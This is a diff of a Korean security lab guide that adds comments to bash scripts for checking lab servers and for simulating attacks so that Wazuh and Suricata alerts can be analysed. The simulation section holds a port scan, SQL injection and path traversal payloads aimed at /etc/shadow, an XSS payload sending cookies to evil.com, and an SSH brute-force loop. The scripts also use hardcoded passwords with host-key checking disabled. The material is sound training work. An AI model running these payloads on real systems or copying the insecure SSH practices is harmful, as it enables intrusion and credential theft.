@@ -176,55 +176,55 @@ echo ""
 # 1. secu 서버
 echo "--- secu (10.20.30.1) ---"
 echo -n "  SSH: "
-sshpass -p1 ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 secu@10.20.30.1 "echo OK" 2>/dev/null || echo "FAIL"
+sshpass -p1 ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 secu@10.20.30.1 "echo OK" 2>/dev/null || echo "FAIL"  # 비밀번호 자동입력 SSH
 
 echo -n "  nftables: "
-sshpass -p1 ssh -o StrictHostKeyChecking=no secu@10.20.30.1 "echo 1 | sudo -S nft list tables 2>/dev/null | wc -l" 2>/dev/null
+sshpass -p1 ssh -o StrictHostKeyChecking=no secu@10.20.30.1 "echo 1 | sudo -S nft list tables 2>/dev/null | wc -l" 2>/dev/null  # 비밀번호 자동입력 SSH
 
 echo -n "  Suricata: "
-sshpass -p1 ssh -o StrictHostKeyChecking=no secu@10.20.30.1 "echo 1 | sudo -S systemctl is-active suricata 2>/dev/null" 2>/dev/null
+sshpass -p1 ssh -o StrictHostKeyChecking=no secu@10.20.30.1 "echo 1 | sudo -S systemctl is-active suricata 2>/dev/null" 2>/dev/null  # 비밀번호 자동입력 SSH
 
 echo -n "  Wazuh Agent: "
-sshpass -p1 ssh -o StrictHostKeyChecking=no secu@10.20.30.1 "echo 1 | sudo -S systemctl is-active wazuh-agent 2>/dev/null" 2>/dev/null
+sshpass -p1 ssh -o StrictHostKeyChecking=no secu@10.20.30.1 "echo 1 | sudo -S systemctl is-active wazuh-agent 2>/dev/null" 2>/dev/null  # 비밀번호 자동입력 SSH
 
 echo ""
 
 # 2. web 서버
 echo "--- web (10.20.30.80) ---"
 echo -n "  SSH: "
-sshpass -p1 ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 web@10.20.30.80 "echo OK" 2>/dev/null || echo "FAIL"
+sshpass -p1 ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 web@10.20.30.80 "echo OK" 2>/dev/null || echo "FAIL"  # 비밀번호 자동입력 SSH
 
 echo -n "  Apache+ModSecurity: "
-sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 "echo 1 | sudo -S systemctl is-active apache2 2>/dev/null" 2>/dev/null
+sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 "echo 1 | sudo -S systemctl is-active apache2 2>/dev/null" 2>/dev/null  # 비밀번호 자동입력 SSH
 
 echo -n "  HTTP: "
-curl -s -o /dev/null -w "%{http_code}" --connect-timeout 3 http://10.20.30.80/ 2>/dev/null || echo "FAIL"
+curl -s -o /dev/null -w "%{http_code}" --connect-timeout 3 http://10.20.30.80/ 2>/dev/null || echo "FAIL"  # silent 모드
 echo ""
 
 echo -n "  Wazuh Agent: "
-sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 "echo 1 | sudo -S systemctl is-active wazuh-agent 2>/dev/null" 2>/dev/null
+sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 "echo 1 | sudo -S systemctl is-active wazuh-agent 2>/dev/null" 2>/dev/null  # 비밀번호 자동입력 SSH
 
 echo ""
 
 # 3. siem 서버
 echo "--- siem (10.20.30.100) ---"
 echo -n "  SSH: "
-sshpass -p1 ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 siem@10.20.30.100 "echo OK" 2>/dev/null || echo "FAIL"
+sshpass -p1 ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 siem@10.20.30.100 "echo OK" 2>/dev/null || echo "FAIL"  # 비밀번호 자동입력 SSH
 
 echo -n "  Wazuh Manager: "
-sshpass -p1 ssh -o StrictHostKeyChecking=no siem@10.20.30.100 "echo 1 | sudo -S systemctl is-active wazuh-manager 2>/dev/null" 2>/dev/null
+sshpass -p1 ssh -o StrictHostKeyChecking=no siem@10.20.30.100 "echo 1 | sudo -S systemctl is-active wazuh-manager 2>/dev/null" 2>/dev/null  # 비밀번호 자동입력 SSH
 
 echo -n "  Wazuh Dashboard: "
-sshpass -p1 ssh -o StrictHostKeyChecking=no siem@10.20.30.100 "echo 1 | sudo -S systemctl is-active wazuh-dashboard 2>/dev/null" 2>/dev/null
+sshpass -p1 ssh -o StrictHostKeyChecking=no siem@10.20.30.100 "echo 1 | sudo -S systemctl is-active wazuh-dashboard 2>/dev/null" 2>/dev/null  # 비밀번호 자동입력 SSH
 
 echo -n "  OpenCTI: "
-curl -s -o /dev/null -w "%{http_code}" --connect-timeout 3 http://10.20.30.100:9400/health 2>/dev/null || echo "FAIL"
+curl -s -o /dev/null -w "%{http_code}" --connect-timeout 3 http://10.20.30.100:9400/health 2>/dev/null || echo "FAIL"  # silent 모드
 echo ""
 
 echo ""
 echo "=== 점검 완료 ==="
 CHECKEOF
-chmod +x /tmp/check_all.sh
+chmod +x /tmp/check_all.sh                             # 파일 권한 변경
 bash /tmp/check_all.sh
 ```
 
@@ -286,7 +286,7 @@ bash /tmp/check_all.sh
 
 ```bash
 # 공격 트래픽 발생
-curl -s "http://10.20.30.80/?id=1%20UNION%20SELECT%201,2,3" > /dev/null
+curl -s "http://10.20.30.80/?id=1%20UNION%20SELECT%201,2,3" > /dev/null  # silent 모드
 
 # 1. nftables 로그 확인 (secu)
 sshpass -p1 ssh -o StrictHostKeyChecking=no secu@10.20.30.1 \
@@ -303,9 +303,9 @@ sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 \
 # 4. Wazuh 알림 확인 (siem)
 sshpass -p1 ssh -o StrictHostKeyChecking=no siem@10.20.30.100 \
   "echo 1 | sudo -S tail -5 /var/ossec/logs/alerts/alerts.json" 2>/dev/null | \
-  python3 -c "
+  python3 -c "                                         # Python 코드 실행
 import sys, json
-for line in sys.stdin:
+for line in sys.stdin:                                 # 반복문 시작
     try:
         e = json.loads(line)
         r = e.get('rule',{})
@@ -423,23 +423,23 @@ echo "=== 인시던트 시뮬레이션 ==="
 
 # 1단계: 공격 발생 (여러 유형)
 echo "[공격 1] 포트 스캔"
-for port in 22 80 443 3306 5432 8080 8443 9200; do
-  nc -zv -w 1 10.20.30.1 $port 2>/dev/null
+for port in 22 80 443 3306 5432 8080 8443 9200; do     # 반복문 시작
+  nc -zv -w 1 10.20.30.1 $port 2>/dev/null             # 네트워크 연결 생성
 done
 
 echo "[공격 2] SQL Injection"
-curl -s "http://10.20.30.80/?id=1%27%20OR%20%271%27=%271" > /dev/null
-curl -s "http://10.20.30.80/?id=1%20UNION%20SELECT%20username,password%20FROM%20users" > /dev/null
+curl -s "http://10.20.30.80/?id=1%27%20OR%20%271%27=%271" > /dev/null  # silent 모드
+curl -s "http://10.20.30.80/?id=1%20UNION%20SELECT%20username,password%20FROM%20users" > /dev/null  # silent 모드
 
 echo "[공격 3] XSS"
-curl -s "http://10.20.30.80/?search=%3Cscript%3Edocument.location=%27http://evil.com/%27%2Bdocument.cookie%3C/script%3E" > /dev/null
+curl -s "http://10.20.30.80/?search=%3Cscript%3Edocument.location=%27http://evil.com/%27%2Bdocument.cookie%3C/script%3E" > /dev/null  # silent 모드
 
 echo "[공격 4] 디렉터리 트래버설"
-curl -s "http://10.20.30.80/../../../../etc/shadow" > /dev/null
+curl -s "http://10.20.30.80/../../../../etc/shadow" > /dev/null  # silent 모드
 
 echo "[공격 5] 브루트포스"
-for i in $(seq 1 5); do
-  sshpass -p wrong ssh -o StrictHostKeyChecking=no -o ConnectTimeout=1 admin@10.20.30.1 2>/dev/null
+for i in $(seq 1 5); do                                # 반복문 시작
+  sshpass -p wrong ssh -o StrictHostKeyChecking=no -o ConnectTimeout=1 admin@10.20.30.1 2>/dev/null  # 비밀번호 자동입력 SSH
 done
 
 echo "=== 공격 완료. 로그를 분석하세요. ==="
@@ -447,13 +447,15 @@ echo "=== 공격 완료. 로그를 분석하세요. ==="
 
 ### 8.3 대응 절차
 
+원격 서버에 접속하여 명령을 실행합니다.
+
 ```bash
 # 1. Wazuh에서 최근 고심각도 알림 확인
 sshpass -p1 ssh -o StrictHostKeyChecking=no siem@10.20.30.100 \
   "echo 1 | sudo -S cat /var/ossec/logs/alerts/alerts.json" 2>/dev/null | \
-  python3 -c "
+  python3 -c "                                         # Python 코드 실행
 import sys, json
-for line in sys.stdin:
+for line in sys.stdin:                                 # 반복문 시작
     try:
         e = json.loads(line)
         r = e.get('rule',{})
@@ -501,10 +503,10 @@ echo ""
 echo "[3] 최근 24시간 고심각도 알림 (Level >= 10)"
 sshpass -p1 ssh -o StrictHostKeyChecking=no siem@10.20.30.100 \
   "echo 1 | sudo -S cat /var/ossec/logs/alerts/alerts.json" 2>/dev/null | \
-  python3 -c "
+  python3 -c "                                         # Python 코드 실행
 import sys, json
 cnt = 0
-for line in sys.stdin:
+for line in sys.stdin:                                 # 반복문 시작
     try:
         e = json.loads(line)
         if int(e.get('rule',{}).get('level',0)) >= 10:
@@ -515,15 +517,15 @@ print(f'  고심각도 알림: {cnt}건')
 
 echo ""
 echo "[4] 디스크 사용량"
-for srv in 10.20.30.1 10.20.30.80 10.20.30.100; do
+for srv in 10.20.30.1 10.20.30.80 10.20.30.100; do     # 반복문 시작
   echo -n "  $srv: "
-  sshpass -p1 ssh -o StrictHostKeyChecking=no user@$srv "df -h / | tail -1 | awk '{print \$5}'" 2>/dev/null
+  sshpass -p1 ssh -o StrictHostKeyChecking=no user@$srv "df -h / | tail -1 | awk '{print \$5}'" 2>/dev/null  # 비밀번호 자동입력 SSH
 done
 
 echo ""
 echo "=== 점검 완료 ==="
 DAILYEOF
-chmod +x /tmp/daily_check.sh
+chmod +x /tmp/daily_check.sh                           # 파일 권한 변경
 bash /tmp/daily_check.sh
 ```
 
